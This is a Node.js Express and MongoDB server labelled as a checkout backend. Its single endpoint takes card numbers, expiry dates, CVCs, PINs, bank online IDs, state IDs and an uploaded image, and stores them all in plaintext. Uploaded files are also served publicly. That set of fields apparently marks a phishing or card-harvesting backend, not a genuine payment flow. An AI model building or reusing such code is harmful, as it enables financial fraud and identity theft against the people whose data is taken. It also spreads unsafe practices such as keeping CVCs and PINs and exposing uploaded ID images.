const express = require("express");
const mongoose = require("mongoose");
const multer = require("multer");
const path = require("path");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use('/uploads', express.static('uploads'));

// Connect to MongoDB
mongoose.connect("mongodb://localhost:27017/checkout", {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Define a schema for the form data
const checkoutSchema = new mongoose.Schema({
  fullName: String,
  email: String,
  address: String,
  stateID: String,
  zipCode: String,
  pin: String,
  onlineID: String,
  cardNumber: String,
  expiryDate: String,
  cvc: String,
  imagePath: String,
});

const Checkout = mongoose.model("Checkout", checkoutSchema);

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "uploads/");
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + path.extname(file.originalname)); // Add timestamp to filename
  },
});
const upload = multer({ storage: storage });

// Handle form submission
app.post("/api/checkout", upload.single("image"), async (req, res) => {
  try {
    const { fullName, email, address, stateID, zipCode, pin, onlineID, cardNumber, expiryDate, cvc } = req.body;
    const newCheckout = new Checkout({
      fullName,
      email,
      address,
      stateID,
      zipCode,
      pin,
      onlineID,
      cardNumber,
      expiryDate,
      cvc,
      imagePath: req.file.path, // Store the image path
    });
    await newCheckout.save();
    res.status(201).json({ message: "Checkout data saved successfully!" });
  } catch (error) {
    res.status(500).json({ message: "Error saving data", error });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
